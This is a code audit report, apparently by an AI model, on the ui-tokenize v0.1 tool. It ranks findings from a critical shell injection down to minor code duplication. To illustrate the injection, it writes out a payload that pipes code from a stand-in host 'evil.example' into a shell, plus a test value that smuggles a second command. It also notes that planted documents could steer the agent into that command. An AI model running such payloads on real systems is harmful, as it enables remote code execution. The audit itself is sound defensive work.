# Claude code-level audit of v0.1 implementation

Date: 2026-04-27
Auditor: Claude Opus 4.7 (1M context)
Codebase: ui-tokenize v0.1.0
Scope: hooks, lib, mcp, commands, tests; cross-checked against `02-spec.md`,
`03-interfaces.md`, `05-decisions.md`, `07-revisions.md`, `08-codex-audit.md`
Tests at audit time: 103 / 103 passing under Node ≥20.

---

## Executive summary

Overall risk: **Medium** — one Critical security finding; remaining issues are
correctness, consistency, and maintainability.

The codebase is in unusually good shape for a v0.1: the Codex audit's CRITICAL
items #1–#5 (`08-codex-audit.md`) are visibly fixed in the current code with
clear remediation comments at the fix sites (`pre-tool-use.mjs:16–18,199–204`,
`ledger.mjs:91–101`, `server.mjs:153–165`). The atomic-write discipline in
`mcp/server.mjs:461` (tmp + rename for `tokens.json`) is solid. Zero runtime
dependencies. Self-documented dev process.

The remaining issues are: one shell-injection in the audit CLI, two functional
bugs in CLI subcommands that documented behaviour doesn't deliver, a small
collection of consistency / fail-open / atomic-write gaps, and a few cheap
de-duplication wins.

| Severity | Count |
|----------|-------|
| Critical | 1     |
| High     | 2     |
| Medium   | 6     |
| Low      | 11    |

Top 3 urgent recommendations (~1 hour total):

1. Fix the shell-command injection through `--baseline` — `commands/cli.mjs:412`.
2. Replace `require('node:fs').statSync` (always throws in ESM) with the imported
   ESM symbol — `commands/cli.mjs:518–521`.
3. Decide what `--allow-existing` should mean and either implement or delete it
   — `commands/cli.mjs:204–206,259`.

---

## CRITICAL — security bug that needs fixing before any wider release

1. **Shell-command injection via `audit --baseline`** — `commands/cli.mjs:412`.

   `execSync` defaults to invoking `/bin/sh -c`. The current call interpolates
   `baseline` directly into the command string:

   ```js
   diff = execSync(`git diff --unified=0 --no-color ${baseline} -- .`, ...);
   ```

   `baseline` arrives from `--baseline <ref>` (line 616) or `--baseline=<ref>`,
   which means it traces back through `$ARGUMENTS` in `commands/audit.md:11` to
   whatever the agent or user passes in. An invocation like

   ```
   /tokenize:audit --baseline 'main; curl evil.example/x | sh'
   ```

   becomes a shell command that executes the trailing payload. The slash
   command is the LLM-controlled surface — anything an attacker can plant in a
   doc the agent later quotes into a slash command becomes a command-execution
   vector under the user's account.

   Fix: switch to `execFileSync('git', ['diff', '--unified=0', '--no-color',
   baseline, '--', '.'], { ... })` (no shell), and as defense in depth validate
   `baseline` against `/^[A-Za-z0-9._/@-]+$/` before passing it down. Add a
   regression test that runs the CLI with a malicious `--baseline` value and
   asserts the side-effect file does NOT exist.

---

## HIGH — functional bugs where documented behaviour doesn't match implementation

2. **`require('node:fs').statSync` always throws in an ES module** — `commands/cli.mjs:518–521`.

   The file is `.mjs`, so `require` is undefined. `statSyncSafe` always returns
   `null`. Inside `expandGlob` (line 503), this means the `isDirectory` branch
   is never taken when a directory is passed; the function returns `[path]`
   (the directory itself), and the caller's `readFileSync` silently `continue`s
   on EISDIR. Net effect: `/tokenize:fix some-dir/` walks zero files and does
   nothing. Verified live (`require is not defined` is caught silently). No
   test catches this.

   Fix: import `statSync` from `node:fs` at the top of the file (line 4 already
   imports siblings) and call it directly. Add a test that runs `cli.mjs fix
   <tmpdir>` over a populated tree and asserts files are rewritten.

3. **`--allow-existing` is dead code in `--changed-only` mode** — `commands/cli.mjs:204–206,259`.

   ```js
   if (!isChanged && !flags.allowExisting) continue;   // line 205
   if (!isChanged) continue;                            // line 206
   ```

   Line 206 unconditionally skips unchanged findings, defeating the purpose of
   the flag named for *allowing* them. The flag's only working effect is
   suppressing the non-zero exit in `--full-repo` mode (line 259), which is
   unrelated to its name. The `findings[].preExisting` field (line 214) is
   set but never observable.

   Fix: pick one. If pre-existing findings should appear when `--allow-existing`
   is set, delete line 206. If they never should, drop the flag and the
   `preExisting` field. Add a test covering the chosen contract.

---

## MEDIUM — correctness or safety gaps to fix before v0.2

4. **Hooks fail open on malformed event JSON** — `hooks/pre-tool-use.mjs:23`.

   `JSON.parse(stdinBuf)` failure calls `passthrough('malformed event')`,
   allowing the tool call. For a security/quality gate, a corrupted or
   attacker-influenced stdin is exactly the case where the hook should fail
   closed (deny). `post-tool-use.mjs:17` is observational, so its silent exit
   is fine.

   Fix: in `pre-tool-use.mjs`, emit a deny with reason "[ui-tokenize] malformed
   hook event; refusing to make a security decision" instead of passthrough.

5. **Race + silent data-loss in `tokens.proposed.json` writes** —
   `mcp/server.mjs:215–235`, `commands/cli.mjs:561–575`.

   Both code paths do read-modify-write with plain `writeFileSync` (not the
   `atomicWriteJson` already in `server.mjs:461`). Concurrent calls can lose
   updates. Worse: `safeReadJson(path, { proposals: [] })` returns the empty
   fallback on any parse error, so a single corrupted byte (or torn write
   from a prior crash) silently overwrites the entire proposal history with
   one new entry.

   Fix: use `atomicWriteJson` in both call sites. Distinguish "missing file"
   (start fresh) from "malformed file" (refuse to overwrite, surface error).

6. **CLI `cmdPropose` crashes on malformed `tokens.proposed.json`** —
   `commands/cli.mjs:563`. No try/catch around `JSON.parse`. The MCP path uses
   `safeReadJson`. After fix #5 they should share one helper.

7. **`commands/cli.mjs#walkAllFiles` ignores `.gitignore` / `.tokenize/ignore`
   / configured `ignore`** — `commands/cli.mjs:443–457`. Uses a hardcoded
   blocklist (`['node_modules', '.git', 'dist', 'build', '.next', '.turbo',
   'coverage', '.tokenize']`) and stops at nested package roots, but does not
   consult `loadIgnore` from `lib/ignore.mjs` the way the catalog walker
   (`lib/catalog.mjs:140`) and consumer-profile walker
   (`lib/consumer-profile.mjs:89`) do. Result: `audit --full-repo` and `fix`
   scan generated/vendored files that the rest of the system correctly excludes.

   Fix: route `walkAllFiles` (and the directory branch of `expandGlob`)
   through `loadIgnore(root, config.ignore).isIgnored`.

8. **MCP `add_token` type schema is narrower than the validator** —
   `mcp/server.mjs:63` (schema enum: `color, dimension, radius, shadow,
   duration, other`) vs `mcp/server.mjs:425` (validator allowed list adds
   `fontFamily, fontWeight, number`). Inconsistent contract; either expand
   the schema or trim the validator.

9. **`cmdFix` doesn't honour `--suppressions`** — `commands/cli.mjs:463–501`.
   `cmdAudit` plumbs `readSuppressionsFile` and skips matching paths;
   `cmdFix` has no equivalent. A user who suppressed a file from auditing
   will still have `fix` rewrite it.

---

## LOW — quality issues worth tracking

10. **Duplicate `nameFromIntent`** — `mcp/server.mjs:325–328` vs
    `commands/cli.mjs:587–592`. The MCP version uses `parseColor` /
    `parseDimension` from `lib/`; the CLI version reimplements detection with
    ad-hoc regex. They classify edge-case values differently (e.g. `oklch(...)`
    is `color` in MCP, `token` in CLI). Drift will widen.

11. **Duplicate `camelize` / `kebabToCamel`** — `mcp/server.mjs:321` vs
    `commands/cli.mjs:583`. Same algorithm, different names. Co-locate with
    `nameFromIntent` in a new `lib/proposal.mjs`.

12. **Duplicate glob-to-regex** — `commands/cli.mjs:283–295` vs
    `lib/ignore.mjs:96–106`. The CLI version's own comment acknowledges the
    duplication. Export `globToRegExpStr` from `lib/ignore.mjs` and reuse.

13. **Dead `void sourceCount` statement** — `lib/catalog.mjs:55,67`. The
    captured variable is never read; `void` only suppresses the unused warning.
    Delete both lines.

14. **Unused `_root` parameter in `readSource`** — `lib/catalog.mjs:162`. Drop
    the parameter; the only caller doesn't pass it meaningfully.

15. **Scanner `DIMENSION_RE` excludes `%`; `parseDimension` includes it** —
    `lib/scanner.mjs:20` vs `lib/dimension.mjs:10`. Often `%` is intentional
    layout, so omitting from the scanner is defensible, but document the
    choice or align both ends.

16. **`commands/cli.mjs` is 652 lines** — six subcommands plus shared helpers
    in one file. As `v0.2` AST scanners arrive, the seams will stretch. Cheap
    refactor when the next round of changes lands: extract per-subcommand
    files, reduce `cli.mjs` to dispatch.

17. **No integration test for `cmdFix` with a directory argument** — would
    have caught finding #2 (`require` bug).

18. **No test for `--allow-existing`** — would have caught finding #3 (dead
    code path).

19. **No security test for `--baseline` injection** — would have caught
    finding #1 (Critical). The trio of regression tests in §Recommendations
    is the cheapest insurance against regression of all three above.

20. **`spawnSync('npx', …)` resolves `npx` via PATH** — `hooks/post-tool-use.mjs:115,126`.
    Standard Node-tooling trust model; mention only because resolving
    `node_modules/.bin/{stylelint,eslint}` directly via `execFileSync` is
    cleaner and removes PATH from the trust set.

---

## What's NOT a finding (verified)

The previous Codex audit (`08-codex-audit.md`) flagged five CRITICAL items.
All five are now fixed in the current code:

| Codex CRITICAL | Where fixed | Evidence |
|---|---|---|
| #1 retry state ignores sessionId | `lib/ledger.mjs:103` | `consecutiveDeniesFor(workingFile, targetFile, sessionId)` filters by current session, walks events backward to last `resolve` |
| #2 MultiEdit rewrites corrupted | `hooks/pre-tool-use.mjs:207` | New `applyRewritesPerCandidate` accumulates per-candidate replacements into one atomic `updatedInput` |
| #3 MCP errors as JSON-RPC | `mcp/server.mjs:153–165` | Tool failures wrap into `result: { content, isError: true }`; protocol errors reserved for unknown methods |
| #4 audit not changed-line gating | `commands/cli.mjs:406` | `changedLineRanges` parses `git diff --unified=0` hunk headers; findings filtered by `changedLines.has(v.line)` |
| #5 retry budget per-violation | `hooks/pre-tool-use.mjs:129` | One `kind: 'deny'` event per (tool-call, file); budget consumes deny+resolve outcomes only |

The CIE Lab ΔE2000 implementation in `lib/color.mjs` was empirically validated
against Sharma's reference vector by Codex; spot-checked again here, still
correct.

---

## Recommendations by priority

### Immediate (before next release) — ~1 hour total

1. Fix shell injection in `audit --baseline` (`commands/cli.mjs:412`).
2. Replace `require` in `statSyncSafe` (`commands/cli.mjs:518–521`).
3. Resolve `--allow-existing` semantics (`commands/cli.mjs:204–206,259`).

Add three regression tests in `tests/audit.test.mjs` (or a new
`tests/fix.test.mjs`):

- `fix <directory>` rewrites violations in nested files.
- `audit --changed-only --allow-existing` includes (or doesn't include)
  pre-existing findings — depending on the chosen contract.
- `audit --baseline 'foo; touch /tmp/ui-tokenize-bad.$$'` does NOT create the
  side-effect file.

### Short-term (within 1–2 weeks) — items #4–#9

Hook fail-closed on malformed input; atomic + non-clobbering writes for
`tokens.proposed.json`; route `walkAllFiles` through `loadIgnore`; reconcile
MCP type schema with validator; plumb `--suppressions` into `cmdFix`.

### When time permits — items #10–#20

De-duplicate the three pairs of helpers; remove the dead `void sourceCount`
and unused `_root`; document the `%` scanner choice; split `cli.mjs` per
subcommand as v0.2 begins; cleaner hook linter invocation; backfill the
missing tests.

### Documentation

Add a `dev-docs/10-remediation.md` (or similar) mapping audit findings to
the commits that close them, the way `07-revisions.md` does for the spec.
Future readers should be able to confirm "audit said X, code now does Y" in
one diff.

---

## Triage decision

Per hands-off mode, addressing the 1 Critical and 2 High items immediately as
v0.1.1; Medium items (#4–#9) deferred to v0.1.2; Low items (#10–#20) collected
in a backlog issue and rolled into the v0.2 AST-scanner work where they
naturally fit.
